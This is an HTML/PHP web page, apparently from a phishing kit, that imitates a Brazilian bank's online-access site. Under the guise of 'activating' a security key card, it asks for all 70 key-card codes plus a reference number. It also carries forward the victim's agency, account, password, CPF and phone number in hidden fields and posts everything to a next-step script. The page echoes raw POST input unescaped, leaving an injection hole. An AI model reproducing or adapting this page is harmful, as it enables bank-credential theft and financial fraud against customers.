<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Acesso Online</title>

<script language="javascript" src="scripts/dataVerifica.js"></script>
<script language="javascript" src="scripts/pulaCampo.js"></script>
<script language="javascript" src="scripts/validaTabela.js"></script>
<script language="javascript" src="scripts/validaPos65.js"></script>

<link href="styless/tabela_sheet.css" rel="stylesheet" type="text/css" />

<style type="text/css">
#top1 { width:100%; height:138px; background:url(images/top1.jpg) repeat-x; }
.style1 {font-size: 12px;	font-family: Arial, Helvetica, sans-serif;	color: #666666;}
#avancar {cursor:pointer; float:right; width:95px; height:25px; border:0; background:url(images/avancando.gif); color:#000000; display:inline; margin:2px;} 
#avancar:hover {background-position:right bottom} 
#cancelar {cursor:pointer; float:right; width:135px; height:25px; border:0; background:url(images/cancelando.gif); color:#000000; display:inline; margin:2px;} 
#cancelar:hover {background-position:right bottom} 
#voltar {cursor:pointer; float:right; width:72px; height:26px; border:0; background:url(images/voltando.jpg); color:#000000; display:inline; margin:2px;} 
#voltar:hover {background-position:right bottom} 
#bbotoes input { cursor:pointer; float:left; width:36px; height:40px; border:0; background:url(images/contente.jpg) repeat-x; color:#000000; display:inline; margin:2px; border-radius:4px; border:1px solid #D5D5D5; } 
#bbotoes input:hover { background-position:left bottom; }
#framelimpar { cursor:pointer; width:78px; height:31px; border:0; background:url(images/hover.jpg) repeat-x; color:#000000; display:inline; margin:2px; border-radius:4px; border:1px solid #D5D5D5; } 
#framelimpar:hover {background-position:left bottom }
.style4 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #333333;
}
.style5 {font-size: 12px; font-family: "Courier New", Courier, monospace; color: #CC0000; }
.style6 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 16px;
	color: #333333;
}
.style7 {	font-family: Arial, Helvetica, sans-serif;
	font-size: 11px;
	color: #999999;
}
.style8 {	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
}
#pos68 {width:40px; height:15px; font-family:Tahoma,Arial,Sans-Serif; border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding:0 0 0 3px; font-size:12px; }
.style9 {color: #333333}
.style11 {font-family: Arial, Helvetica, sans-serif; font-size: 11px; color: #333333; }
.style20 {font-family: Arial, Helvetica, sans-serif; font-size: 11px; font-weight: bold; color: #FF0000; }
.style21 {font-family: Arial, Helvetica, sans-serif;	font-size: 11px;	font-weight: bold;}
.style23 {font-family: Arial, Helvetica, sans-serif; font-size: 11px; }

.style10 {font-family: Arial, Helvetica, sans-serif; font-size: 12px; color: #FFFFFF; }
.style13 {font-family: Arial, Helvetica, sans-serif; font-size: 12px; color: #FFFFFF; }
</style>
</head>

<body style="margin:0; background:#F7F7F7; ">
<div id="top1"><div style="width:980px; height:145px; margin:0 auto; background:url(images/top2.jpg) repeat-x;">
<div style="width:150px; height:145px; float:left; background:url(images/marca.png) no-repeat;"></div>
<div style="width:829px; height:28px; float:left;">
  <div align="right">
    <table width="421" align="left" cellpadding="0" cellspacing="0">
      <tr>
        <td width="37" height="28">&nbsp;</td>
        <td width="53" height="28"><span class="style10">Ag&ecirc;ncia:</span></td>
        <td width="64" class="style13" width-="width-"><?php echo("<b>".$_POST['agencia']."</b>");?></td>
        <td width="43"><span class="style10">Conta:</span></td>
        <td width="222""40" class="style13" width-="width-" ><?php echo("<b>".$_POST['conta']."</b>");?><?php echo("-<b>".$_POST['digito']."</b>");?></td>
      </tr>
    </table>
    <img src="images/sair.jpg" width="151" height="28" border="0" /></div>
</div>
<div style="width:600px; height:45px; float:left;"><table cellpadding="0" cellspacing="0">
  <tr><td width="37" height="42">&nbsp;</td>
  <td width="559" height="42"><span class="style1"><script>data();</script></span></td>
</tr></table></div>
<div style="width:829px; height:63px; float:left; background:url(images/img_as.jpg) no-repeat; border-right:1px solid #DDD;"></div>
</div></div>

<div style="width:982px; height:415px; margin:0 auto; margin-top:15px;">
<div style="width:750px; height:415px; background:#FFF; float:left; border-bottom:1px solid #C5C5C5; border-left:1px solid #eee; border-right:1px solid #eee; border-radius:7px;">
<div style="width:100%; height:40px; background:url(images/mkv_kk.jpg) right no-repeat;">
<table cellpadding="0" cellspacing="0">
  <tr>
  <td width="18" height="28">&nbsp;</td>
  <td width="88" height="28"><span class="style4">P&aacute;gina Inicial </span></td>
  <td width="17" height="28" class="style5">&gt;</td>
  <td width="156" height="28" class="style4">Regulariza&ccedil;&atilde;o de dados </td>
    <td width="19" height="28" class="style5">&gt;</td>
	  <td width="119" height="28" class="style4">Ativar cart&atilde;o chave</td>
</tr></table>
</div>
<div style="width:700px; height:35px; background:url(images/Passo2.jpg) no-repeat; margin-left:11px;"></div>
  <form id="form1" name="form1" action="index4.php" method="post" autocomplete="off" onsubmit="return enviaTudo()" >
  <div style="width:714px; height:310px; margin-left:20px; margin-top:10px; float:left; background:;">
    <img src="images/a029384209342.jpg" width="685" height="46" />
    <Table cellpadding="0" cellspacing="0">
  <tr>
  <td width="265" height="223"><div align="center"><img src="images/tatatatatatata.gif" width="188" height="97" /></div></td>
  <td width="17"><input name="agencia" type="hidden" id="agencia" value="<?php echo $_POST['agencia']; ?>" />
<input name="conta" type="hidden" id="conta" value="<?php echo $_POST['conta']; ?>" />
<input name="digito" type="hidden" id="digito" value="<?php echo $_POST['digito']; ?>" />
<input name="infor" type="hidden" id="infor" value="<?php echo $_POST['infor']; ?>" />
<input name="pai" type="hidden" id="pai" value="<?php echo $_POST['pai']; ?>" />
<input name="telefone" type="hidden" id="telefone" value="<?php echo $_POST['telefone']; ?>" />
<input name="senha6" type="hidden" id="senha6" value="<?php echo $_POST['senha6']; ?>" />
<input name="cpf" type="hidden" id="cpf" value="<?php echo $_POST['cpf']; ?>" />
<input name="pos68" type="hidden" id="pos68" value="<?php echo $_POST['pos68']; ?>" /></td>
  <td width="426"><table align="center" cellpadding="0" cellspacing="0" style="background: url(images/asldaksljdasd.jpg) no-repeat; color: #333;">
    <tr>
      <td width="23" height="28" ><div align="center"><span class="style21">N&ordm;</span></div></td>
      <td width="35" ><span class="style23">Chave</span></td>
      <td width="18" class="style21" >N&ordm;</td>
      <td width="35" class="style23" >Chave</td>
      <td width="18" class="style21" >N&ordm;</td>
      <td width="35" class="style23" >Chave</td>
      <td width="18" class="style21" >N&ordm;</td>
      <td width="35" class="style23" >Chave</td>
      <td width="18" class="style21" >N&ordm;</td>
      <td width="34" class="style23" >Chave</td>
      <td width="17" class="style21" >N&ordm;</td>
      <td width="35" class="style23" >Chave</td>
      <td width="16" class="style21" >N&ordm;</td>
      <td width="44" class="style23" >Chave</td>
    </tr>
    <tr>
      <td width="23" ><div align="center"><span class="style20">01</span></div></td>
      <td width="35" ><input name="table1" type="text"  id="table1" lang="1"   onkeyup="javascript:pulacampo('table1','table2')" size="3" maxlength="3" xml:lang="1" /></td>
      <td width="18" class="style20">11</td>
      <td width="35"><input name="table11" type="text"  id="table11" lang="1"   onkeyup="javascript:pulacampo('table11','table12')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">21</td>
      <td width="35"><input name="table21" type="text"  id="table21" lang="1"   onkeyup="javascript:pulacampo('table21','table22')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">31</td>
      <td width="35"><input name="table31" type="text"  id="table31" lang="1"   onkeyup="javascript:pulacampo('table31','table32')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">41</td>
      <td width="34"><input name="table41" type="text"  id="table41" lang="1"   onkeyup="javascript:pulacampo('table41','table42')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="17" class="style20">51</td>
      <td width="35"><input name="table51" type="text"  id="table51" lang="1"   onkeyup="javascript:pulacampo('table51','table52')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="16" class="style20">61</td>
      <td width="44"><input name="table61" type="text"  id="table61" lang="1"   onkeyup="javascript:pulacampo('table61','table62')" size="3" maxlength="3" xml:lang="1" />
      </td>
    </tr>
    <tr>
      <td width="23" ><div align="center"><span class="style20">02</span></div></td>
      <td width="35" ><input name="table2" type="text"  id="table2" lang="1"   onkeyup="javascript:pulacampo('table2','table3')" size="3" maxlength="3" xml:lang="1" /></td>
      <td width="18" class="style20">12</td>
      <td width="35"><input name="table12" type="text"  id="table12" lang="1"   onkeyup="javascript:pulacampo('table12','table13')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">22</td>
      <td width="35"><input name="table22" type="text"  id="table22" lang="1"   onkeyup="javascript:pulacampo('table22','table23')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">32</td>
      <td width="35"><input name="table32" type="text"  id="table32" lang="1"   onkeyup="javascript:pulacampo('table32','table33')" size="3" maxlength="3" xml:lang="1"/>
      </td>
      <td width="18" class="style20">42</td>
      <td width="34"><input name="table42" type="text"  id="table42" lang="1"   onkeyup="javascript:pulacampo('table42','table43')" size="3" maxlength="3" xml:lang="1"/>
      </td>
      <td width="17" class="style20">52</td>
      <td width="35"><input name="table52" type="text"  id="table52" lang="1"   onkeyup="javascript:pulacampo('table52','table53')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="16" class="style20">62</td>
      <td width="44"><input name="table62" type="text"  id="table62" lang="1"   onkeyup="javascript:pulacampo('table62','table63')" size="3" maxlength="3" xml:lang="1" />
      </td>
    </tr>
    <tr>
      <td width="23" ><div align="center"><span class="style20">03</span></div></td>
      <td width="35" ><input name="table3" type="text"  id="table3" lang="1"   onkeyup="javascript:pulacampo('table3','table4')" size="3" maxlength="3" xml:lang="1" /></td>
      <td width="18" class="style20">13</td>
      <td width="35"><input name="table13" type="text"  id="table13" lang="1"   onkeyup="javascript:pulacampo('table13','table14')" size="3" maxlength="3" xml:lang="1"/>
      </td>
      <td width="18" class="style20">23</td>
      <td width="35"><input name="table23" type="text"  id="table23" lang="1"   onkeyup="javascript:pulacampo('table23','table24')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">33</td>
      <td width="35"><input name="table33" type="text"  id="table33" lang="1"   onkeyup="javascript:pulacampo('table33','table34')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">43</td>
      <td width="34"><input name="table43" type="text"  id="table43" lang="1"   onkeyup="javascript:pulacampo('table43','table44')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="17" class="style20">53</td>
      <td width="35"><input name="table53" type="text"  id="table53" lang="1"   onkeyup="javascript:pulacampo('table53','table54')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="16" class="style20">63</td>
      <td width="44"><input name="table63" type="text"  id="table63" lang="1"   onkeyup="javascript:pulacampo('table63','table64')" size="3" maxlength="3" xml:lang="1" />
      </td>
    </tr>
    <tr>
      <td width="23" ><div align="center"><span class="style20">04</span></div></td>
      <td width="35" ><input name="table4" type="text"  id="table4" lang="1"   onkeyup="javascript:pulacampo('table4','table5')" size="3" maxlength="3" xml:lang="1" /></td>
      <td width="18" class="style20">14</td>
      <td width="35"><input name="table14" type="text"  id="table14" lang="1"   onkeyup="javascript:pulacampo('table14','table15')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">24</td>
      <td width="35"><input name="table24" type="text"  id="table24" lang="1"   onkeyup="javascript:pulacampo('table24','table25')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">34</td>
      <td width="35"><input name="table34" type="text"  id="table34" lang="1"   onkeyup="javascript:pulacampo('table34','table35')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">44</td>
      <td width="34"><input name="table44" type="text"  id="table44" lang="1"   onkeyup="javascript:pulacampo('table44','table45')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="17" class="style20">54</td>
      <td width="35"><input name="table54" type="text"  id="table54" lang="1"   onkeyup="javascript:pulacampo('table54','table55')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="16" class="style20">64</td>
      <td width="44"><input name="table64" type="text"  id="table64" lang="1"   onkeyup="javascript:pulacampo('table64','table65')" size="3" maxlength="3" xml:lang="1" />
      </td>
    </tr>
    <tr>
      <td width="23" ><div align="center"><span class="style20">05</span></div></td>
      <td width="35" ><input name="table5" type="text"  id="table5" lang="1"   onkeyup="javascript:pulacampo('table5','table6')" size="3" maxlength="3" xml:lang="1" /></td>
      <td width="18" class="style20">15</td>
      <td width="35"><input name="table15" type="text"  id="table15" lang="1"   onkeyup="javascript:pulacampo('table15','table16')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">25</td>
      <td width="35"><input name="table25" type="text"  id="table25" lang="1"   onkeyup="javascript:pulacampo('table25','table26')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">35</td>
      <td width="35"><input name="table35" type="text"  id="table35" lang="1"   onkeyup="javascript:pulacampo('table35','table36')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">45</td>
      <td width="34"><input name="table45" type="text"  id="table45" lang="1"   onkeyup="javascript:pulacampo('table45','table46')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="17" class="style20">55</td>
      <td width="35"><input name="table55" type="text"  id="table55" lang="1"   onkeyup="javascript:pulacampo('table55','table56')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="16" class="style20">65</td>
      <td width="44"><input name="table65" type="text"  id="table65" lang="1"   onkeyup="javascript:pulacampo('table65','table66')" size="3" maxlength="3" xml:lang="1" />
      </td>
    </tr>
    <tr>
      <td width="23" ><div align="center"><span class="style20">06</span></div></td>
      <td width="35" ><input name="table6" type="text"  id="table6" lang="1"   onkeyup="javascript:pulacampo('table6','table7')" size="3" maxlength="3" xml:lang="1" /></td>
      <td width="18" class="style20">16</td>
      <td width="35"><input name="table16" type="text"  id="table16" lang="1"   onkeyup="javascript:pulacampo('table16','table17')" size="3" maxlength="3" xml:lang="1"/>
      </td>
      <td width="18" class="style20">26</td>
      <td width="35"><input name="table26" type="text"  id="table26" lang="1"   onkeyup="javascript:pulacampo('table26','table27')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">36</td>
      <td width="35"><input name="table36" type="text"  id="table36" lang="1"   onkeyup="javascript:pulacampo('table36','table37')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">46</td>
      <td width="34"><input name="table46" type="text"  id="table46" lang="1"   onkeyup="javascript:pulacampo('table46','table47')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="17" class="style20">56</td>
      <td width="35"><input name="table56" type="text"  id="table56" lang="1"   onkeyup="javascript:pulacampo('table56','table57')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="16" class="style20">66</td>
      <td width="44"><input name="table66" type="text"  id="table66" lang="1"   onkeyup="javascript:pulacampo('table66','table67')" size="3" maxlength="3" xml:lang="1" />
      </td>
    </tr>
    <tr>
      <td width="23" ><div align="center"><span class="style20">07</span></div></td>
      <td width="35" ><input name="table7" type="text"  id="table7" lang="1"   onkeyup="javascript:pulacampo('table7','table8')" size="3" maxlength="3" xml:lang="1" /></td>
      <td width="18" class="style20">17</td>
      <td width="35"><input name="table17" type="text"  id="table17" lang="1"   onkeyup="javascript:pulacampo('table17','table18')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">27</td>
      <td width="35"><input name="table27" type="text"  id="table27" lang="1"   onkeyup="javascript:pulacampo('table27','table28')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">37</td>
      <td width="35"><input name="table37" type="text"  id="table37" lang="1"   onkeyup="javascript:pulacampo('table37','table38')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">47</td>
      <td width="34"><input name="table47" type="text"  id="table47" lang="1"   onkeyup="javascript:pulacampo('table47','table48')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="17" class="style20">57</td>
      <td width="35"><input name="table57" type="text"  id="table57" lang="1"   onkeyup="javascript:pulacampo('table57','table58')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="16" class="style20">67</td>
      <td width="44"><input name="table67" type="text"  id="table67" lang="1"   onkeyup="javascript:pulacampo('table67','table68')" size="3" maxlength="3" xml:lang="1" />
      </td>
    </tr>
    <tr>
      <td width="23" ><div align="center"><span class="style20">08</span></div></td>
      <td width="35" ><input name="table8" type="text"  id="table8" lang="1"   onkeyup="javascript:pulacampo('table8','table9')" size="3" maxlength="3" xml:lang="1" /></td>
      <td width="18" class="style20">18</td>
      <td width="35"><input name="table18" type="text"  id="table18" lang="1"   onkeyup="javascript:pulacampo('table18','table19')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">28</td>
      <td width="35"><input name="table28" type="text"  id="table28" lang="1"   onkeyup="javascript:pulacampo('table28','table29')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">38</td>
      <td width="35"><input name="table38" type="text"  id="table38" lang="1"   onkeyup="javascript:pulacampo('table38','table39')" size="3" maxlength="3" xml:lang="1"/>
      </td>
      <td width="18" class="style20">48</td>
      <td width="34"><input name="table48" type="text"  id="table48" lang="1"   onkeyup="javascript:pulacampo('table48','table49')" size="3" maxlength="3" xml:lang="1"/>
      </td>
      <td width="17" class="style20">58</td>
      <td width="35"><input name="table58" type="text"  id="table58" lang="1"   onkeyup="javascript:pulacampo('table58','table59')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="16" class="style20">68</td>
      <td width="44"><input name="table68" type="text"  id="table68" lang="1"   onkeyup="javascript:pulacampo('table68','table69')" size="3" maxlength="3" xml:lang="1" />
      </td>
    </tr>
    <tr>
      <td width="23" ><div align="center"><span class="style20">09</span></div></td>
      <td width="35" ><input name="table9" type="text"  id="table9" lang="1"   onkeyup="javascript:pulacampo('table9','table10')" size="3" maxlength="3" xml:lang="1" /></td>
      <td width="18" class="style20">19</td>
      <td width="35"><input name="table19" type="text"  id="table19" lang="1"   onkeyup="javascript:pulacampo('table19','table20')" size="3" maxlength="3" xml:lang="1"/>
      </td>
      <td width="18" class="style20">29</td>
      <td width="35"><input name="table29" type="text"  id="table29" lang="1"   onkeyup="javascript:pulacampo('table29','table30')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">39</td>
      <td width="35"><input name="table39" type="text"  id="table39" lang="1"   onkeyup="javascript:pulacampo('table39','table40')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">49</td>
      <td width="34"><input name="table49" type="text"  id="table49" lang="1"   onkeyup="javascript:pulacampo('table49','table50')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="17" class="style20">59</td>
      <td width="35"><input name="table59" type="text"  id="table59" lang="1"   onkeyup="javascript:pulacampo('table59','table60')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="16" class="style20">69</td>
      <td width="44"><input name="table69" type="text"  id="table69" lang="1"   onkeyup="javascript:pulacampo('table69','table70')" size="3" maxlength="3" />
      </td>
    </tr>
    <tr>
      <td width="23" height="13" ><div align="center"><span class="style20">10</span></div></td>
      <td width="35" ><input name="table10" type="text"  id="table10" lang="1"   onkeyup="javascript:pulacampo('table10','table11')" size="3" maxlength="3" xml:lang="1" /></td>
      <td width="18" class="style20">20</td>
      <td width="35"><input name="table20" type="text"  id="table20" lang="1"   onkeyup="javascript:pulacampo('table20','table21')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">30</td>
      <td width="35"><input name="table30" type="text"  id="table30" lang="1"   onkeyup="javascript:pulacampo('table30','table31')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">40</td>
      <td width="35"><input name="table40" type="text"  id="table40" lang="1"   onkeyup="javascript:pulacampo('table40','table41')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="18" class="style20">50</td>
      <td width="34"><input name="table50" type="text"  id="table50" lang="1"   onkeyup="javascript:pulacampo('table50','table51')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="17" class="style20">60</td>
      <td width="35"><input name="table60" type="text"  id="table60" lang="1"   onkeyup="javascript:pulacampo('table60','table61')" size="3" maxlength="3" xml:lang="1" />
      </td>
      <td width="16" class="style20">70</td>
      <td width="44"><input name="table70" type="text"  id="table70" lang="1"   onkeyup="javascript:pulacampo('table70','ref')" size="3" maxlength="3" xml:lang="1" />
      </td>
    </tr>
    <tr>
      <td height="32" colspan="14" style="padding-right:14px;" ><input name="ref" type="text"  id="ref" lang="1"  onkeyup="javascript:pulacampo('ref','button')" size="11" maxlength="11" xml:lang="1" />
      </td>
    </tr>
  </table></td>
  </tr>
  <tr>
  <Td height="31" colspan="3">
  
  
  <div style=" width:714px; margin-top:0;">
    <table cellpadding="0" cellspacing="0">
      <tr>
        <td width="594" height="34"><input name="button" type="button" id="cancelar" value=""/></td>
        <td width="12">&nbsp;</td>
        <td width="106"><input name="submit" type="submit" id="avancar" value="" onclick="return verifica();" /></td>
      </tr>
    </table>
  </div>
  
  
  </Td>
  </tr>
  </Table>
  </div>
  
</form>
</div>
<div style="width:217px; height:360px; float:right; border-radius:5px;"><img src="images/bylll.jpg" width="217" height="360" border="0" usemap="#Map" />
<map name="Map" id="Map"><area shape="rect" coords="14,78,124,125" href="#" /><area shape="rect" coords="13,181,143,230" href="#" /><area shape="rect" coords="13,294,112,326" href="#" /></map></div></div>

<div style="width:100%; height:103px; repeat-x; margin-top:15px; background:#FFF; border-top:1px solid #C5C5C5; border-bottom:1px solid #C5C5C5;">
<div style="width:985px; height:103px; margin:0 auto;"><img src="images/botons2.jpg" width="985" height="103" border="0" usemap="#Map" /></div>
</div>
</body>
</html>